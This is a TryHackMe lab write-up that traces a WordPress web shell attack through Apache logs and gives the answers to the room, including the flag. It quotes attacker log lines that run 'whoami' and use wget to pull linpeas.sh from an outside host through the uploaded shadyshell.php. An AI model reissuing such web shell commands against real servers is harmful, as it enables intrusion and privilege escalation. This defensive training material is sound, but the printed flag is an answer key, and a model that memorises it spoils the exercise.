# TryHackMe – Detecting Web Shells

This room focused on investigating a compromised WordPress server using Apache access logs. The goal was to identify the attacker's activity, understand how the web shell was used, and trace the attack from reconnaissance to post-exploitation.

---

## 1. Which IP address likely belongs to the attacker?

### How I solved it

I started by looking for repeated **404 Not Found** responses since attackers often perform directory enumeration before finding a valid path.

```bash
cat access.log | grep "404"
```

One IP address consistently stood out because it generated multiple failed requests and used a suspicious User-Agent.

**Answer:** `203.0.113.66`

---

## 2. What is the first directory the attacker successfully identifies?

### How I solved it

After identifying the attacker's IP, I followed its requests in chronological order. There were several failed requests before the attacker finally discovered the first valid directory.

**Answer:** `/wordpress`

---

## 3. What is the name of the PHP file used to upload the web shell?

### How I solved it

I searched the logs for PHP files being accessed.

```bash
grep ".php" access.log
```

Among the results, one PHP file was repeatedly accessed with command parameters, indicating it was the uploaded web shell.

**Answer:** `shadyshell.php`

---

## 4. What is the first command executed using the web shell?

### How I solved it

Since web shell commands were passed through the `cmd` parameter, I searched for it in the logs.

```bash
cat access.log | grep "cmd"
```

The first command executed was:

```text
GET /wordpress/wp-content/uploads/shadyshell.php?cmd=whoami
```

**Answer:** `whoami`

---

## 5. What file does the attacker download after gaining web shell access?

### How I solved it

While reviewing the command execution logs, I noticed the attacker used the `wget` command to download another file onto the server.

```text
GET /wordpress/wp-content/uploads/shadyshell.php?cmd=wget http://x.x.x.x/linpeas.sh
```

Knowing that **LinPEAS** is commonly used for Linux privilege escalation made this activity easy to identify.

**Answer:** `linpeas.sh`

---

## 6. Find the hidden flag.

### How I solved it

Since the logs showed that the web shell was uploaded to the WordPress uploads directory, I navigated there.

```bash
cd /var/www/html/wordpress/wp-content/uploads
```

Then I viewed the contents of the PHP file.

```bash
cat shadyshell.php
```

The hidden flag was embedded inside the web shell.

**Flag**

```text
THM{W3b_Sh3ll_Int3rnals}
```

---
